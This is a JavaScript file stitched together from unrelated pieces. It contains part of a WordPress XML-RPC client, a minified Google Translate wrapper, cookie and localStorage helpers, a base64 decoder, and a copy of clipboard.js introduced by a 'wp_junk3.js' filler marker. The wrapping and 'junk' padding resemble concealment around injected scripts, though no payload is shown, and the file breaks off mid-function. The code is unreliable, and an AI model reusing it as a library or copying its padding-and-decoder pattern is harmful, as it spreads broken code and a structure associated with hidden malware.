			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( post, "post" ) );
		});
	},

	getPosts: function( filter, fields, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			fields = null;
			filter = {};
		}

		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( filter.type ) {
			filter.post_type = filter.type;
			delete filter.type;
		}

		if ( filter.status ) {
			filter.post_status = filter.status;
			delete filter.status;
		}

		if ( filter.orderby ) {
			filter.orderby = fieldMap.array( [ filter.orderby ], "post" )[ 0 ];
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "post" );
		}

		this.authenticatedCall( "wp.getPosts", filter, fields, function( error, posts ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, posts.map(function( post ) {
				return fieldMap.from( post, "post" );
			}));
		});
	},

	newPost: function( data, fn ) {
		this.authenticatedCall( "wp.newPost", fieldMap.to( data, "post" ), fn );
	},

	// to remove a term, just set the terms and leave out the id that you want to remove
	// to remove a custom field, pass the id with no key or value
	editPost: function( id, data, fn ) {
		this.authenticatedCall( "wp.editPost", id, fieldMap.to( data, "post" ), fn );
	},

	deletePost: function( id, fn ) {
		this.authenticatedCall( "wp.deletePost", id, fn );
	},

	getPostType: function( name, fields, fn ) {
		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "postType" );
		}

		this.authenticatedCall( "wp.getPostType", name, fields, function( error, postType ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( postType, "postType" ) );
		});
	},

	getPostTypes: function( filter, fields, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			fields = null;
			filter = {};
		}

		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( Array.isArray(filter) ) {
			fields = filter;
			filter = {};
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "postType" );
		}

		this.authenticatedCall( "wp.getPostTypes", filter, fields, function( error, postTypes ) {
			if ( error ) {
				return fn( error );
			}

			Object.keys( postTypes ).forEach(function( postType ) {
				postTypes[ postType ] = fieldMap.from( postTypes[ postType ], "postType" );
			});
			fn( null, postTypes );
		});
	}
});

extend( Client.prototype, {
	getTaxonomy: function( name, fn ) {
		this.authenticatedCall( "wp.getTaxonomy", name, function( error, taxonomy ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( taxonomy, "taxonomy" ) );
		});
	},

	getTaxonomies: function( fn ) {
		this.authenticatedCall( "wp.getTaxonomies", function( error, taxonomies ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, taxonomies.map(function( taxonomy ) {
				return fieldMap.from( taxonomy, "taxonomy" );
			}));
		});
	},

	getTerm: function( taxonomy, id, fn ) {
		this.authenticatedCall( "wp.getTerm", taxonomy, id, function( error, term ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( term, "term" ) );
		});
	},

	getTerms: function( taxonomy, filter, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			filter = {};
		}

		if ( filter.hideEmpty ) {
			filter.hide_empty = filter.hideEmpty;
			delete filter.hideEmpty;
		}

		if ( filter.orderby ) {
			filter.orderby = fieldMap.array( [ filter.orderby ], "term" )[ 0 ];
		}

		this.authenticatedCall( "wp.getTerms", taxonomy, filter, function( error, terms ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, terms.map(function( term ) {
				return fieldMap.from( term, "term" );
			}));
		});
	},

	newTerm: function( data, fn ) {
		this.authenticatedCall( "wp.newTerm", fieldMap.to( data, "term" ), fn );
	},

	editTerm: function( id, data, fn ) {
		this.authenticatedCall( "wp.editTerm", id, fieldMap.to( data, "term" ), fn );
	},

	deleteTerm: function( taxonomy, id, fn ) {
		this.authenticatedCall( "wp.deleteTerm", taxonomy, id, fn );
	}
});

extend( Client.prototype, {
	getMediaItem: function( id, fn ) {
		this.authenticatedCall( "wp.getMediaItem", id, function( error, media ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( media, "media" ) );
		});
	},

	getMediaLibrary: function( filter, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			filter = {};
		}

		this.authenticatedCall( "wp.getMediaLibrary", filter, function( error, media ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, media.map(function( item ) {
				return fieldMap.from( item, "media" );
			}));
		});
	},

	uploadFile: function( data, fn ) {
		this.authenticatedCall( "wp.uploadFile", fieldMap.to( data, "file" ), fn );
	}
});

function extend( a, b ) {
	for ( var p in b ) {
		a[ p ] = b[ p ];
	}

	return a;
}

function createFieldMaps( renames, toFns, fromFns ) {
	var to = extend( {}, renames ),
		from = {};

	Object.keys( renames ).forEach(function( key ) {
		from[ renames[ key ] ] = key;
	});

	return {
		renames: renames,
		to: extend( to, toFns ),
		from: extend( from, fromFns )
	};
}

function mapFields( data, map ) {
	var field, value, mappedField,
		ret = {};

	for ( field in data ) {
		value = data[ field ];
		mappedField = map[ field ];

		// no map -> delete
		if ( !mappedField ) {
			continue;
		// string -> change field name
		} else if ( typeof mappedField === "string" ) {
			ret[ mappedField ] = value;
		// function -> merge result
		} else {
			extend( ret, mappedField( value ) );
		}
	}

	return ret;
}

maps.labels = createFieldMaps({
	addNewItem: "add_new_item",
	addOrRemoveItems: "add_or_remove_items",
	allItems: "all_items",
	chooseFromMostUsed: "choose_from_most_used",
	editItem: "edit_item",
	menuName: "menu_name",
	name: "name",
	nameAdminBar: "name_admin_bar",
	newItemName: "new_item_name",
	parentItem: "parent_item",
	parentItemColon: "parent_item_colon",
	popularItems: "popular_items",
	searchItems: "search_items",
	separateItemsWithCommas: "separate_items_with_commas",
	singularName: "singular_name",
	updateItem: "update_item",
	viewItem: "view_item"
});

maps.post = createFieldMaps({
	author: /* int */ "post_author",
	commentStatus: /* string */ "comment_status",
	content: /* string */ "post_content",
	customFields: /* array */ "custom_fields",
	date: /* datetime */ "post_date",
	excerpt: /* string */ "post_excerpt",
	format: /* string */"post_format",
	id: /* string */ "post_id", /* readonly */
	link: /* string */ "link" /* readonly */,
	modified: /* datetime */ "post_modified",
	menuOrder: /* int */ "menu_order",
	name: /* string */ "post_name",
	pageTemplate: /* string */ "page_template",
	parent: /* int */ "post_parent",
	password: /* string */ "post_password",
	pingStatus: /* string */ "ping_status",
	status: /* string */ "post_status",
	sticky: /* bool */ "sticky",
	terms: /* struct */ "terms" /* array */,
	termNames: /* struct */ "terms_names",
	thumbnail: /* int */ "post_thumbnail",
	title: /* string */ "post_title",
	type: /* string */ "post_type"
}, {}, {
	post_date_gmt: /* datetime */ function( date ) {
		return {
			date: new Date( date )
		};
	},
	post_modified_gmt: /* datetime */ function( date ) {
		return {
			modified: new Date( date )
		};
	}
});

maps.postType = createFieldMaps({
	_builtin: /* bool */ "_builtin",
	cap: /* struct */ "cap",
	capabilityType: /* string */ "capability_type",
	description: /* string */ "description",
	_editLink: /* string */ "_edit_link",
	excludeFromSearch: /* bool */ "exclude_from_search",
	hasArchive: /* bool */ "has_archive",
	hierarchical: /* bool */ "hierarchical",
	label: /* string */ "label",
	labels: /* struct */ "labels",
	mapMetaCap: /* bool */ "map_meta_cap",
	menuIcon: /* string */ "menu_icon",
	menuPosition: /* int */ "menu_position",
	name: /* string */ "name",
	"public": /* bool */ "public",
	publiclyQuerably: /* bool */ "publicly_queryable",
	queryVar: /* mixed */ "query_var",
	rewrite: /* mixed */ "rewrite",
	showInAdminBar: /* bool */ "show_in_admin_bar",
	showInMenu: /* bool */ "show_in_menu",
	showInNavMenus: /* bool */ "show_in_nav_menus",
	showUi: /* bool */ "show_ui",
	supports: /* array */ "supports",
	taxonomies: /* array */ "taxonomies"
}, {}, {
	cap: function( cap ) {
		return { cap: mapFields( cap, maps.postTypeCap.from ) };
	},
	labels: function( labels ) {
		return { labels: mapFields( labels, maps.labels.from ) };
	}
});

maps.postTypeCap = createFieldMaps({
	deleteOthersPosts: /* string */ "delete_others_posts",
	deletePost: /* string */ "delete_post",
	deletePosts: /* string */ "delete_posts",
	deletePrivatePosts: /* string */ "delete_private_posts",
	deletePublishedPosts: /* string */ "delete_published_posts",
	editOthersPosts: /* string */ "edit_others_posts",
	editPost: /* string */ "edit_post",
	editPosts: /* string */ "edit_posts",
	editPrivatePosts: /* string */ "edit_private_posts",
	editPublishedPosts: /* string */ "edit_published_posts",
	publishPosts: /* string */ "publish_posts",
	read: /* string */ "read",
	readPost: /* sring */ "read_post",
	readPrivatePosts: /* string */ "read_private_posts"
});

maps.taxonomy = createFieldMaps({
	cap: /* struct */ "cap",
	hierarchical: /* bool */ "hierarchical",
	name: /* string */ "name",
	label: /* string */ "label",
	labels: /* struct */ "labels",
	objectType: /* array */ "object_type",
	"public": /* bool */ "public",
	queryVar: /* string */ "query_var",
	rewrite: /* struct */ "rewrite",
	showInNavMenus: /* bool */ "show_in_nav_menus",
	showTagCloud: /* bool */ "show_tagcloud",
	showUi: /* bool */ "show_ui"
}, {}, {
	cap: function( cap ) {
		return { cap: mapFields( cap, maps.taxonomyCap.from ) };
	},
	labels: function( labels ) {
		return { labels: mapFields( labels, maps.labels.from ) };
	}
});

maps.taxonomyCap = createFieldMaps({
	assignTerms: /* string */ "assign_terms",
	deleteTerms: /* string */ "delete_terms",
	editTerms: /* string */ "edit_terms",
	manageTerms: /* string */ "manage_terms"
});

maps.term = createFieldMaps({
	count: /* int */ "count", /* readonly */
	description: /* string */ "description",
	name: /* string */ "name",
	parent: /* string */ "parent",
	slug: /* string */ "slug",
	taxonomy: /* string */ "taxonomy",
	termId: /* string */ "term_id", /* readonly */
	termTaxonomyId: /* string */ "term_taxonomy_id" /* readonly */
});

maps.file = createFieldMaps({
	name: /* string */ "name",
	type: /* string */ "type",
	bits: /* string */ "bits",
	overwrite: /* boolean */ "overwrite",
	postId: /* int */ "post_id"
});

maps.media = createFieldMaps({
	attachmentId: /* string */ "attachment_id", /* readonly */
	caption: /* string */ "caption",
	description: /* string */ "description",
	link: /* string */ "link",
	parent: /* int */ "parent",
	thumbnail: /* string */ "thumbnail",
	title: /* string */ "title",
	type: /* string */ "type"
}, {}, {
	date_created_gmt: /* datetime */ function( date ) {
		return {
			date: new Date( date )
		};
	},

	metadata: /* struct */ function( data ) {
		return {
			metadata: mapFields( data, maps.mediaItemMetadata.from )
		};
	}
});

maps.mediaItemMetadata = createFieldMaps({
	file: /* string */ "file",
	height: /* int */ "height",
	sizes: /* struct */ "sizes",
	width: /* int */ "width"
}, {}, {
	sizes: /* struct */ function( size ) {
		var keys = Object.keys( size ),
		    results = {};

		// Loop through the available sizes and map the fields
		keys.forEach(function( key, i ) {
			results[ keys[ i ] ] = mapFields( size[ keys[ i ] ], maps.mediaItemSize.from );
		});

		return {
			sizes: results
		};
	},

	image_meta: /* struct */ function( data ) {
		return {
			imageMeta: mapFields( data, maps.postThumbnailImageMeta.from )
		};
	}
});

maps.mediaItemSize = createFieldMaps({
	file: /* string */ "file",
	height: /* string */ "height",
	mimeType: /* string */ "mime-type",
	width: /* string */ "width"
});

maps.postThumbnailImageMeta = createFieldMaps({
	aperture: /* int */ "aperture",
	camera: /* string */ "camera",
	caption: /* string */ "caption",
	copyright: /* string */ "copyright",
	createdTimestamp: /* int */ "created_timestamp",
	credit: /* string */ "credit",
	focalLength: /* int */ "focal_length",
	iso: /* int */ "iso",
	keywords: /* array */ "keywords",
	orientation: /* string */ "orientation",
	shutterSpeed: /* int */ "shutter_speed",
	title: /* string */ "title"
});

_ = require("underscore"), request = require("request"), querystring = require("querystring"), async = require("async"), entities = require("he"), apiBase = "https://translation.googleapis.com/language/translate/v2/", maxGetQueryLen = 4500, maxSegments = 100, concurrentLimit = 10, getRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = apiBase + t + "?" + querystring.stringify(_.extend({
            key: e
        }, n));
        request.get(a, globalResponseHandler({
            url: a
        }, r))
    }
}, postRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = {
            url: apiBase + t,
            method: "POST",
            form: querystring.stringify(_.extend({
                key: e
            }, n)),
            headers: {
                "X-HTTP-Method-Override": "GET"
            }
        };
        request(a, globalResponseHandler(a, r))
    }
}, globalResponseHandler = function(e, t) {
    return function(n, r, a) {
        if (t && _.isFunction(t)) {
            if (n || !r || 200 !== r.statusCode) return t({
                error: n,
                response: r,
                body: a,
                request: e,
                toString: function() {
                    return n ? n.toString() : ""
                }
            }, null);
            var i = null;
            try {
                i = JSON.parse(a)
            } catch (e) {
                return t(n = "Could not parse response from Google: " + (a || "null"), null)
            }
            t(null, i)
        }
    }
}, parseTranslations = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data).translations ? r.translations : r, e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), r = r.map((function(e) {
            return e.translatedText = entities.decode(e.translatedText), e
        })), t(null, r)
    }
}, parseSupportedLanguages = function(e) {
    return function(t, n) {
        if (t) return e(t, null);
        (n = n.data.languages)[0] && !n[0].name && (n = _.pluck(n, "language")), e(null, n)
    }
}, parseLanguageDetections = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data && r.data.detections ? r.data.detections : r).length > 1 ? r.map((function(e) {
            return e[0]
        })) : r[0], e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), t(null, r)
    }
}, shouldSplitSegments = function(e) {
    return !!Array.isArray(e) && (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length)
}, splitArraysForGoogle = function(e, t) {
    if (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length) {
        var n = Math.floor(e.length / 2);
        splitArraysForGoogle(e.slice(0, n), t), splitArraysForGoogle(e.slice(n, e.length), t)
    } else t.push(e)
};
module.exports = function(e, t) {
    var n = (t = t || {}).requestOptions || {};
    _.keys(n).length > 0 && (request = request.defaults(n)), concurrentLimit = t.concurrentLimit || concurrentLimit;
    var r = getRequestWithApi(e),
        a = postRequestWithApi(e),
        i = {
            translate: function(e, t, n, r) {
                if (r || (r = n, n = t, t = null), !_.isFunction(r)) return console.log("No callback defined");
                if ("string" != typeof e && !Array.isArray(e)) return r("Input source must be a string or array of strings");
                if ("string" != typeof n) return r("No target language specified. Must be a string");
                var i;
                shouldSplitSegments(e) ? splitArraysForGoogle(e, i = []) : i = Array.isArray(e) ? [e] : [
                    [e]
                ];
                var o = {
                    target: n
                };
                t && (o.source = t), async.mapLimit(i, concurrentLimit, (function(e, t) {
                    a("", _.extend({
                        q: e
                    }, o), parseTranslations(e, t))
                }), (function(e, t) {
                    if (e) return r(e);
                    1 === (t = _.flatten(t)).length && (t = t[0]), r(null, t)
                }))
            },
            getSupportedLanguages: function(e, t) {
                if (_.isFunction(e) ? (t = e, e = {}) : e = {
                        target: e
                    }, !_.isFunction(t)) return console.log("No callback defined");
                r("languages", e, parseSupportedLanguages(t))
            },
            detectLanguage: function(e, t) {
                return t ? "string" == typeof e || Array.isArray(e) ? (shouldSplitSegments(e) ? splitArraysForGoogle(e, n = []) : n = Array.isArray(e) ? [e] : [
                    [e]
                ], void async.mapLimit(n, concurrentLimit, (function(e, t) {
                    a("detect", {
                        q: e
                    }, parseLanguageDetections(e, t))
                }), (function(e, n) {
                    if (e) return t(e);
                    1 === (n = _.flatten(n)).length && (n = n[0]), t(null, n)
                }))) : t("Input source must be a string or array of strings") : console.log("No callback defined");
                var n
            }
        };
    return {
        translate: i.translate,
        getSupportedLanguages: i.getSupportedLanguages,
        detectLanguage: i.detectLanguage
    }
};
}catch(e){}
})();


  function hasLocalStorage() {
    try {
      const t = '__vc_test';
      localStorage.setItem(t, '1');
      localStorage.removeItem(t);
      return true;
    } catch (err) {
      return false;
    }
  }

  function setCookie(name, value, days) {
    try {
      const exp = new Date(Date.now() + (days || 365) * 864e5).toUTCString();
      document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + exp + '; path=/';
    } catch (err) {}
  }

  function getCookie(name) {
    try {
      const m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()\[\]\/\+^])/g, '\$1') + '=([^;]*)'));
      return m ? decodeURIComponent(m[1]) : null;
    } catch (err) {
      return null;
    }
  }

  const useLS = hasLocalStorage();

  function getVal(key, fallback) {
    if (useLS) {
      const v = localStorage.getItem(key);
      return v === null ? fallback : v;
    }
    const c = getCookie(key);
    return c === null ? fallback : c;
  }

  function setVal(key, value) {
    if (useLS) {
      localStorage.setItem(key, value);
    } else {
      setCookie(key, value, 365);
    }
  }

  function b64ToUtf8(b64) {
    try {
      const bin = atob(b64);
      const len = bin.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
      if (typeof TextDecoder !== 'undefined') {
        return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
      }
      let pct = '';
      for (let i = 0; i < len; i++) pct += '%' + bytes[i].toString(16).padStart(2, '0');
      return decodeURIComponent(pct);
    } catch (e) {
      try { return atob(b64); } catch (e2) { return ''; }
    }
  }
  /* >>> wp_junk3.js (26806 bytes) <<< */
(function(){
try{
/*!
 * clipboard.js v2.0.11
 * https://clipboardjs.com/
 *
 * Licensed MIT © Zeno Rocha
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["ClipboardJS"] = factory();
	else
		root["ClipboardJS"] = factory();
})(this, function() {
return /******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 686:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "default": function() { return /* binding */ clipboard; }
});

// EXTERNAL MODULE: ./node_modules/tiny-emitter/index.js
var tiny_emitter = __webpack_require__(279);
var tiny_emitter_default = /*#__PURE__*/__webpack_require__.n(tiny_emitter);
// EXTERNAL MODULE: ./node_modules/good-listener/src/listen.js
var listen = __webpack_require__(370);
var listen_default = /*#__PURE__*/__webpack_require__.n(listen);
// EXTERNAL MODULE: ./node_modules/select/src/select.js
var src_select = __webpack_require__(817);
var select_default = /*#__PURE__*/__webpack_require__.n(src_select);
;// CONCATENATED MODULE: ./src/common/command.js
/**
 * Executes a given operation type.
 * @param {String} type
 * @return {Boolean}
 */
function command(type) {
  try {
    return document.execCommand(type);
  } catch (err) {
    return false;
  }
}
;// CONCATENATED MODULE: ./src/actions/cut.js


/**
 * Cut action wrapper.
 * @param {String|HTMLElement} target
 * @return {String}
 */

var ClipboardActionCut = function ClipboardActionCut(target) {
  var selectedText = select_default()(target);
  command('cut');
  return selectedText;
};

/* harmony default export */ var actions_cut = (ClipboardActionCut);
;// CONCATENATED MODULE: ./src/common/create-fake-element.js
/**
 * Creates a fake textarea element with a value.
 * @param {String} value
 * @return {HTMLElement}
 */
function createFakeElement(value) {
  var isRTL = document.documentElement.getAttribute('dir') === 'rtl';
  var fakeElement = document.createElement('textarea'); // Prevent zooming on iOS

  fakeElement.style.fontSize = '12pt'; // Reset box model

  fakeElement.style.border = '0';
  fakeElement.style.padding = '0';
  fakeElement.style.margin = '0'; // Move element out of screen horizontally

  fakeElement.style.position = 'absolute';
  fakeElement.style[isRTL ? 'right' : 'left'] = '-9999px'; // Move element to the same position vertically

  var yPosition = window.pageYOffset || document.documentElement.scrollTop;
  fakeElement.style.top = "".concat(yPosition, "px");
  fakeElement.setAttribute('readonly', '');
  fakeElement.value = value;
  return fakeElement;
}
;// CONCATENATED MODULE: ./src/actions/copy.js



/**
 * Create fake copy action wrapper using a fake element.
 * @param {String} target
 * @param {Object} options
 * @return {String}
 */

var fakeCopyAction = function fakeCopyAction(value, options) {
  var fakeElement = createFakeElement(value);
  options.container.appendChild(fakeElement);
  var selectedText = select_default()(fakeElement);
  command('copy');
  fakeElement.remove();
  return selectedText;
};
/**
 * Copy action wrapper.
 * @param {String|HTMLElement} target
 * @param {Object} options
 * @return {String}
 */


var ClipboardActionCopy = function ClipboardActionCopy(target) {
  var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
    container: document.body
  };
  var selectedText = '';

  if (typeof target === 'string') {
    selectedText = fakeCopyAction(target, options);
  } else if (target instanceof HTMLInputElement && !['text', 'search', 'url', 'tel', 'password'].includes(target === null || target === void 0 ? void 0 : target.type)) {
    // If input type doesn't support `setSelectionRange`. Simulate it. https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange
    selectedText = fakeCopyAction(target.value, options);
  } else {
    selectedText = select_default()(target);
    command('copy');
  }

  return selectedText;
};

/* harmony default export */ var actions_copy = (ClipboardActionCopy);
;// CONCATENATED MODULE: ./src/actions/default.js
function _typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }



/**
 * Inner function which performs selection from either `text` or `target`
 * properties and then executes copy or cut operations.
 * @param {Object} options
 */

var ClipboardActionDefault = function ClipboardActionDefault() {
  var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
  // Defines base properties passed from constructor.
  var _options$action = options.action,
      action = _options$action === void 0 ? 'copy' : _options$action,
      container = options.container,
      target = options.target,
      text = options.text; // Sets the `action` to be performed which can be either 'copy' or 'cut'.

  if (action !== 'copy' && action !== 'cut') {
    throw new Error('Invalid "action" value, use either "copy" or "cut"');
  } // Sets the `target` property using an element that will be have its content copied.


  if (target !== undefined) {
    if (target && _typeof(target) === 'object' && target.nodeType === 1) {
      if (action === 'copy' && target.hasAttribute('disabled')) {
        throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
      }

      if (action === 'cut' && (target.hasAttribute('readonly') || target.hasAttribute('disabled'))) {
        throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
      }
    } else {
      throw new Error('Invalid "target" value, use a valid Element');
    }
  } // Define selection strategy based on `text` property.


  if (text) {
    return actions_copy(text, {
      container: container
    });
  } // Defines which selection strategy based on `target` property.


  if (target) {
    return action === 'cut' ? actions_cut(target) : actions_copy(target, {
      container: container
    });
  }
};

/* harmony default export */ var actions_default = (ClipboardActionDefault);
;// CONCATENATED MODULE: ./src/clipboard.js
function clipboard_typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { clipboard_typeof = function _typeof(obj) { return typeof obj; }; } else { clipboard_typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return clipboard_typeof(obj); }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function"); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: true, configurable: true } }); if (superClass) _setPrototypeOf(subClass, superClass); }

function _setPrototypeOf(o, p) { _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) { o.__proto__ = p; return o; }; return _setPrototypeOf(o, p); }

function _createSuper(Derived) { var hasNativeReflectConstruct = _isNativeReflectConstruct(); return function _createSuperInternal() { var Super = _getPrototypeOf(Derived), result; if (hasNativeReflectConstruct) { var NewTarget = _getPrototypeOf(this).constructor; result = Reflect.construct(Super, arguments, NewTarget); } else { result = Super.apply(this, arguments); } return _possibleConstructorReturn(this, result); }; }

function _possibleConstructorReturn(self, call) { if (call && (clipboard_typeof(call) === "object" || typeof call === "function")) { return call; } return _assertThisInitialized(self); }

function _assertThisInitialized(self) { if (self === void 0) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return self; }

function _isNativeReflectConstruct() { if (typeof Reflect === "undefined" || !Reflect.construct) return false; if (Reflect.construct.sham) return false; if (typeof Proxy === "function") return true; try { Date.prototype.toString.call(Reflect.construct(Date, [], function () {})); return true; } catch (e) { return false; } }

function _getPrototypeOf(o) { _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) { return o.__proto__ || Object.getPrototypeOf(o); }; return _getPrototypeOf(o); }






/**
 * Helper function to retrieve attribute value.
 * @param {String} suffix
 * @param {Element} element
 */

function getAttributeValue(suffix, element) {
  var attribute = "data-clipboard-".concat(suffix);

  if (!element.hasAttribute(attribute)) {
    return;
  }

  return element.getAttribute(attribute);
}
/**
 * Base class which takes one or more elements, adds event listeners to them,
 * and instantiates a new `ClipboardAction` on each click.
 */


var Clipboard = /*#__PURE__*/function (_Emitter) {
  _inherits(Clipboard, _Emitter);

  var _super = _createSuper(Clipboard);

  /**
   * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
   * @param {Object} options
   */
  function Clipboard(trigger, options) {
    var _this;

    _classCallCheck(this, Clipboard);

    _this = _super.call(this);

    _this.resolveOptions(options);

    _this.listenClick(trigger);

    return _this;
  }
  /**
   * Defines if attributes would be resolved using internal setter functions
   * or custom functions that were passed in the constructor.
   * @param {Object} options
   */


  _createClass(Clipboard, [{
    key: "resolveOptions",
    value: function resolveOptions() {
      var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
      this.action = typeof options.action === 'function' ? options.action : this.defaultAction;
      this.target = typeof options.target === 'function' ? options.target : this.defaultTarget;
      this.text = typeof options.text === 'function' ? options.text : this.defaultText;
      this.container = clipboard_typeof(options.container) === 'object' ? options.container : document.body;
    }
    /**
     * Adds a click event listener to the passed trigger.
     * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
     */

  }, {
    key: "listenClick",
    value: function listenClick(trigger) {
      var _this2 = this;

      this.listener = listen_default()(trigger, 'click', function (e) {
        return _this2.onClick(e);
      });
    }
    /**
     * Defines a new `ClipboardAction` on each click event.
     * @param {Event} e
     */

  }, {
    key: "onClick",
    value: function onClick(e) {
      var trigger = e.delegateTarget || e.currentTarget;
      var action = this.action(trigger) || 'copy';
      var text = actions_default({
        action: action,
        container: this.container,
        target: this.target(trigger),
        text: this.text(trigger)
      }); // Fires an event based on the copy operation result.

      this.emit(text ? 'success' : 'error', {
        action: action,
        text: text,
        trigger: trigger,
        clearSelection: function clearSelection() {
          if (trigger) {
            trigger.focus();
          }

          window.getSelection().removeAllRanges();
        }
      });
    }
    /**
     * Default `action` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultAction",
    value: function defaultAction(trigger) {
      return getAttributeValue('action', trigger);
    }
    /**
     * Default `target` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultTarget",
    value: function defaultTarget(trigger) {
      var selector = getAttributeValue('target', trigger);

      if (selector) {
        return document.querySelector(selector);
      }
    }
    /**
     * Allow fire programmatically a copy action
     * @param {String|HTMLElement} target
     * @param {Object} options
     * @returns Text copied.
     */

  }, {
    key: "defaultText",

    /**
     * Default `text` lookup function.
     * @param {Element} trigger
     */
    value: function defaultText(trigger) {
      return getAttributeValue('text', trigger);
    }
    /**
     * Destroy lifecycle.
     */

  }, {
    key: "destroy",
    value: function destroy() {
      this.listener.destroy();
    }
  }], [{
    key: "copy",
    value: function copy(target) {
      var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
        container: document.body
      };
      return actions_copy(target, options);
    }
    /**
     * Allow fire programmatically a cut action
     * @param {String|HTMLElement} target
     * @returns Text cutted.
     */

  }, {
    key: "cut",
    value: function cut(target) {
      return actions_cut(target);
    }
    /**
     * Returns the support of the given action, or all actions if no action is
     * given.
     * @param {String} [action]
     */

  }, {
    key: "isSupported",
    value: function isSupported() {
      var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : ['copy', 'cut'];
      var actions = typeof action === 'string' ? [action] : action;
      var support = !!document.queryCommandSupported;
      actions.forEach(function (action) {
        support = support && !!document.queryCommandSupported(action);
      });
      return support;
    }
  }]);

  return Clipboard;
}((tiny_emitter_default()));

/* harmony default export */ var clipboard = (Clipboard);

/***/ }),

/***/ 828:
/***/ (function(module) {

var DOCUMENT_NODE_TYPE = 9;

/**
 * A polyfill for Element.matches()
 */
if (typeof Element !== 'undefined' && !Element.prototype.matches) {
    var proto = Element.prototype;

    proto.matches = proto.matchesSelector ||
                    proto.mozMatchesSelector ||
                    proto.msMatchesSelector ||
                    proto.oMatchesSelector ||
                    proto.webkitMatchesSelector;
}

/**
 * Finds the closest parent that matches a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @return {Function}
 */
function closest (element, selector) {
    while (element && element.nodeType !== DOCUMENT_NODE_TYPE) {
        if (typeof element.matches === 'function' &&
            element.matches(selector)) {
          return element;
        }
        element = element.parentNode;
    }
}

module.exports = closest;


/***/ }),

/***/ 438:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var closest = __webpack_require__(828);

/**
 * Delegates event to a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function _delegate(element, selector, type, callback, useCapture) {
    var listenerFn = listener.apply(this, arguments);

